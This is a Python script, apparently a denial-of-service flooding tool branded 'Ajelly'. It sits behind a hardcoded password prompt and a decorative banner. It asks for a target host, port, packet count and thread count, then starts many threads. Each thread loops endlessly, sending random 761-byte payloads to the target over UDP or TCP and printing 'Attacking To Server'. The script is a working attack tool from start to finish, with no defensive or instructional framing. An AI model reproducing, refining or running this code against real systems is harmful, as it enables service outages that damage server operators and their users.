import random
import socket
import threading
import time
import os,sys
import random, socket, threading

pasw = "Ajelly"

for i in range(3):
    pwd = input(" Password : ")
    j = 3
    if (pwd == pasw):
        time.sleep(2)
        print("\033[0;31m[0] Loading.......")
        time.sleep(1)
        print("\033[0;32m[10] Loading......")
        time.sleep(1)
        print("\033[0;33m[20] Loading.......")
        time.sleep(1)
        print("\033[0;34m[30] Loading.......")
        time.sleep(1)
        print("\033[0;35m[40] Loading.......")
        time.sleep(1)
        print("\033[0;36m[50] Loading.......")
        time.sleep(1)
        print("\033[0;32m[60] Loading.......")
        time.sleep(1)
        print("\033[0;33m[70] Loading.......")
        time.sleep(1)
        print("\033[0;34m[80] Loading.......")
        time.sleep(1)
        print("\033[0;35m[90] Loading.......")
        time.sleep(1)
        print("\033[0;36m[100] Processing\n")
        time.sleep(3)
        break
    else:
        time.sleep(2)
        print("[x] Wrong Password \n")
        continue
time.sleep(2)
print("Succesfull Logins")
time.sleep(2)

os.system("clear")
print("""
\033[0;32m                 ██████ ▓██   ██▓ ███▄    █\033[0;35m ▄▄▄█████▓ ▄▄▄     ▒██   ██▒
\033[0;32m               ▒██    ▒  ▒██  ██▒ ██ ▀█   █\033[0;35m ▓  ██▒ ▓▒▒████▄   ▒▒ █ █ ▒░
\033[0;32m               ░ ▓██▄     ▒██ ██░▓██  ▀█ ██\033[0;35m▒▒ ▓██░ ▒░▒██  ▀█▄ ░░  █   ░
\033[0;32m                 ▒   ██▒  ░ ▐██▓░▓██▒  ▐▌██\033[0;35m▒░ ▓██▓ ░ ░██▄▄▄▄██ ░ █ █ ▒ 
\033[0;32m               ▒██████▒▒  ░ ██▒▓░▒██░   ▓██\033[0;35m░  ▒██▒ ░  ▓█   ▓██▒██▒ ▒██▒
\033[0;32m               ▒ ▒▓▒ ▒ ░   ██▒▒▒ ░ ▒░   ▒ ▒\033[0;35m   ▒ ░░    ▒▒   ▓▒█▒▒ ░ ░▓ ░
\033[0;32m               ░ ░▒  ░   ▓██ ░▒░ ░ ░░   ░ ▒\033[0;35m░    ░      ░   ▒▒ ░░   ░▒ ░
\033[0;32m               ░  ░  ░   ▒ ▒ ░░     ░   ░ ░\033[0;35m   ░ ░      ░   ▒   ░    ░  
\033[0;32m                     ░   ░ ░              ░\033[0;35m                ░   ░    ░ 
Ajelly""")
print("\033[35m━━━ Are you sure to run this operation? (y/n)")
choice = str(input("┗━>\033[0m:"))
print("\033[32mLoading")
time.sleep(1)
print("\033[34mLoading")
time.sleep(1)
print("\033[35mLoading")
time.sleep(1)
print("\033[31m━━━ Host/IP")
ip = str(input("┗━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ Port")
port = int(input("┗━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ Packets")	
times = int(input("┗━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ Threads")
threads = int(input("┗━>\033[0m:"))
fake_ip = '182.21.20.32'
fake_ip = '51.79.218.114'

def xxxxx():
  data = random._urandom(761)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[35ms}=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Server Attack")

def xxxx():
  data = random._urandom(761)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[35ms}=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Server Attack")

def xxx():
  data = random._urandom(761)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[35ms}=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Server Attack")

def xx():
  data = random._urandom(761)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[35m}=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] Server Attack")

def x():
  data = random._urandom(761)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[35ms}=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] Server Attack")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = xxxxx)
    th.start()
    th = threading.Thread(target = xxxx)
    th.start()
    th = threading.Thread(target = xxx)
    th.start()
  else:
    th = threading.Thread(target = xx)
    th.start()
    th = threading.Thread(target = x)
    th.start()